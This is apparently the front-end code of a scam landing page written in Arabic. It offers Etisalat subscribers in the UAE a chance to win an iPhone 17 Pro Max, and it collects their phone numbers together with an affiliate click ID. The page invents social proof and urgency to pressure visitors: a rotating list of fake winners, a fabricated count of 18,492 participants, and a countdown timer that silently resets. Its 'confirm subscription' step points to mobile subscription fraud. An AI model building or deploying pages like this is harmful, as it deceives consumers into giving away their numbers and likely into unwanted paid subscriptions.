import { useState, useEffect } from 'react';

export default function Home() {

  const [clickId, setClickId] = useState('');
  const [msisdn, setMsisdn] = useState('');
  const [step, setStep] = useState(1);
  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false);
  const [winnerIndex, setWinnerIndex] = useState(0);
  const [countdown, setCountdown] = useState(179);

  const winners = [
    'أحمد من دبي فاز قبل دقيقة واحدة',
    'محمد من أبوظبي حصل على iPhone 17',
    'سارة من الشارقة انضمت الآن',
    'فاطمة من العين ربحت الجائزة الكبرى',
    'علي من عجمان تم تأكيد اشتراكه'
  ];

  useEffect(() => {

    const params = new URLSearchParams(window.location.search);

    if (params.get('cid')) {
      setClickId(params.get('cid'));
    }

    const winnerInterval = setInterval(() => {
      setWinnerIndex(prev =>
        (prev + 1) % winners.length
      );
    }, 3000);

    const countdownInterval = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 0) return 179;
        return prev - 1;
      });
    }, 1000);

    return () => {
      clearInterval(winnerInterval);
      clearInterval(countdownInterval);
    };

  }, []);

  async function handleSubmit() {

    if (!msisdn) {
      setMessage('يرجى إدخال رقم الهاتف');
      return;
    }

    setLoading(true);
    setMessage('');

    let cleanMsisdn = msisdn.trim();

    if (cleanMsisdn.startsWith('0')) {
      cleanMsisdn = cleanMsisdn.substring(1);
    }

    if (!cleanMsisdn.startsWith('971')) {
      cleanMsisdn = '971' + cleanMsisdn;
    }

    try {

      const response = await fetch('/api/request', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          msisdn: cleanMsisdn,
          click_id: clickId
        })
      });

      const data = await response.json();

      if (data.success) {

        setStep(2);

      } else {

        setMessage('❌ هذا الرقم غير مؤهل حالياً');

      }

    } catch (err) {

      setMessage('❌ حدث خطأ، حاول مرة أخرى');

    }

    setLoading(false);

  }

  const minutes = Math.floor(countdown / 60);
  const seconds = countdown % 60;

  return (

    <div style={styles.body} dir="rtl">

      <div style={styles.overlay}></div>

      <div style={styles.container}>

        <div style={styles.liveBar}>
          🔥 {winners[winnerIndex]}
        </div>

        <div style={styles.card}>

          <div style={styles.badge}>
            عرض حصري لمشتركي اتصالات
          </div>

          <img
            src="https://images.unsplash.com/photo-1695048133142-1a20484d2569?q=80&w=1200&auto=format&fit=crop"
            style={styles.phoneImage}
          />

          <h1 style={styles.title}>
            اربح iPhone 17 Pro Max
          </h1>

          <p style={styles.subtitle}>
            🎁 السحب السنوي الأكبر في الإمارات
          </p>

          <div style={styles.timerBox}>
            ⏰ ينتهي العرض خلال
            <span style={styles.timer}>
              {minutes}:{seconds < 10 ? '0' + seconds : seconds}
            </span>
          </div>

          <div style={styles.steps}>

            <div style={styles.stepItem}>
              ✅ أدخل رقم هاتفك
            </div>

            <div style={styles.stepItem}>
              ✅ تأكيد الاشتراك
            </div>

            <div style={styles.stepItem}>
              ✅ دخول السحب فوراً
            </div>

          </div>

          {step === 1 && (

            <>

              <input
                type="tel"
                placeholder="5xxxxxxxx"
                value={msisdn}
                onChange={(e) =>
                  setMsisdn(
                    e.target.value.replace(/\D/g, '')
                  )
                }
                style={styles.input}
              />

              <button
                style={styles.button}
                onClick={handleSubmit}
              >
                {loading
                  ? 'جاري التحقق...'
                  : '🎁 شارك الآن'}
              </button>

            </>

          )}

          {step === 2 && (

            <div style={styles.successBox}>

              <div style={styles.successIcon}>
                ✅
              </div>

              <div style={styles.successTitle}>
                تم تسجيلك بنجاح!
              </div>

              <div style={styles.successText}>
                لقد تم إدخالك في السحب على
                iPhone 17 Pro Max
              </div>

            </div>

          )}

          {message && (
            <div style={styles.message}>
              {message}
            </div>
          )}

          <div style={styles.bottomUsers}>
            👥 أكثر من 18,492 مستخدم شاركوا اليوم
          </div>

        </div>

      </div>

    </div>

  );

}

const styles = {

  body: {

    minHeight: '100vh',

    backgroundImage:
      'url(https://images.unsplash.com/photo-1516321318423-f06f85e504b3?q=80&w=1600&auto=format&fit=crop)',

    backgroundSize: 'cover',

    backgroundPosition: 'center',

    display: 'flex',

    justifyContent: 'center',

    alignItems: 'center',

    padding: '20px',

    position: 'relative',

    overflow: 'hidden'

  },

  overlay: {

    position: 'absolute',

    top: 0,

    left: 0,

    width: '100%',

    height: '100%',

    background:
      'linear-gradient(to bottom, rgba(0,0,0,0.75), rgba(0,0,0,0.92))'

  },

  container: {

    width: '100%',

    maxWidth: '470px',

    position: 'relative',

    zIndex: 2

  },

  liveBar: {

    background: '#16a34a',

    padding: '12px',

    borderRadius: '12px',

    marginBottom: '15px',

    textAlign: 'center',

    fontWeight: 'bold',

    color: 'white',

    animation: 'pulse 1s infinite'

  },

  card: {

    background:
      'linear-gradient(180deg,#171717,#0f0f0f)',

    borderRadius: '26px',

    padding: '30px 25px',

    border: '1px solid rgba(255,255,255,0.1)',

    backdropFilter: 'blur(10px)',

    boxShadow:
      '0 20px 50px rgba(0,0,0,0.5)',

    textAlign: 'center',

    color: 'white'

  },

  badge: {

    background: '#facc15',

    color: '#000',

    fontWeight: 'bold',

    display: 'inline-block',

    padding: '8px 16px',

    borderRadius: '999px',

    marginBottom: '18px',

    fontSize: '14px'

  },

  phoneImage: {

    width: '210px',

    marginBottom: '20px',

    filter:
      'drop-shadow(0 10px 25px rgba(255,215,0,0.3))'

  },

  title: {

    fontSize: '34px',

    fontWeight: 'bold',

    color: '#facc15',

    marginBottom: '12px'

  },

  subtitle: {

    color: '#d4d4d4',

    marginBottom: '22px',

    fontSize: '18px'

  },

  timerBox: {

    background: '#991b1b',

    borderRadius: '14px',

    padding: '14px',

    marginBottom: '22px',

    fontWeight: 'bold',

    fontSize: '17px'

  },

  timer: {

    display: 'block',

    marginTop: '8px',

    fontSize: '30px',

    color: '#facc15'

  },

  steps: {

    marginBottom: '22px'

  },

  stepItem: {

    background: '#1f2937',

    padding: '12px',

    borderRadius: '12px',

    marginBottom: '10px',

    fontSize: '15px'

  },

  input: {

    width: '100%',

    height: '58px',

    borderRadius: '16px',

    border: '2px solid #333',

    background: '#111827',

    color: 'white',

    padding: '0 18px',

    fontSize: '20px',

    marginBottom: '16px'

  },

  button: {

    width: '100%',

    height: '60px',

    borderRadius: '16px',

    border: 'none',

    background:
      'linear-gradient(90deg,#facc15,#eab308)',

    color: '#000',

    fontSize: '22px',

    fontWeight: 'bold',

    cursor: 'pointer',

    boxShadow:
      '0 10px 25px rgba(250,204,21,0.35)',

    transition: '0.2s'

  },

  successBox: {

    background: '#052e16',

    padding: '25px',

    borderRadius: '18px'

  },

  successIcon: {

    fontSize: '55px',

    marginBottom: '10px'

  },

  successTitle: {

    fontSize: '28px',

    fontWeight: 'bold',

    marginBottom: '12px',

    color: '#4ade80'

  },

  successText: {

    color: '#d4d4d4',

    lineHeight: '1.6'

  },

  message: {

    marginTop: '18px',

    color: '#f87171',

    fontWeight: 'bold'

  },

  bottomUsers: {

    marginTop: '25px',

    color: '#9ca3af',

    fontSize: '14px'

  }

};